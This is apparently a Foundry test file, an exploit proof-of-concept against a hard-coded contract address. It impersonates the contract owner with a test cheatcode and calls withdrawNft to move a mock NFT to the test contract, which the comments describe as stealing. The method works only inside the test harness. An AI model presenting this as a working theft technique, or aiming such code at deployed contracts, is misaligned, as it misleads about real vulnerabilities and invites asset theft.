// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface CUSD {
    function owner() external view returns (address);
    function withdrawNft(address token_, address destination_, uint256 tokenId_) external;
}

interface IERC721 {
    function transferFrom(address from, address to, uint256 tokenId) external;
    function ownerOf(uint256 tokenId) external view returns (address);
}

contract MockERC721 {
    mapping(uint256 => address) private _owners;

    function mint(address to, uint256 tokenId) public {
        require(_owners[tokenId] == address(0), "Token already minted");
        _owners[tokenId] = to;
    }

    function transferFrom(address from, address to, uint256 tokenId) external {
        require(_owners[tokenId] == from, "Not owner");
        _owners[tokenId] = to;
    }

    function ownerOf(uint256 tokenId) external view returns (address) {
        address owner = _owners[tokenId];
        require(owner != address(0), "Token does not exist");
        return owner;
    }
}



contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────

    address constant TARGET = 0xC285B7E09A4584D027E5BC36571785B515898246;
    address attacker = address(this);
    MockERC721 public mockNFT;
    address public owner;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Deploy mock ERC721
        mockNFT = new MockERC721();

        // Mint NFT to target contract
        mockNFT.mint(TARGET, 1);

        // Verify target owns the NFT
        assertEq(mockNFT.ownerOf(1), TARGET);

        // Get the current owner of CUSD contract
        address owner = CUSD(TARGET).owner();

        // Label addresses for debugging
        vm.label(address(mockNFT), "MockNFT");
        vm.label(owner, "CUSD Owner");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Get the actual owner address from CUSD contract
        owner = CUSD(TARGET).owner();
        console.log("Owner address:", owner);

        // Impersonate the owner
        vm.startPrank(owner);

        // Call withdrawNft to steal the NFT
        CUSD(TARGET).withdrawNft(address(mockNFT), attacker, 1);

        vm.stopPrank();

        // Verify the NFT was transferred to attacker
        assertEq(mockNFT.ownerOf(1), attacker, "NFT not stolen");
    }




    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

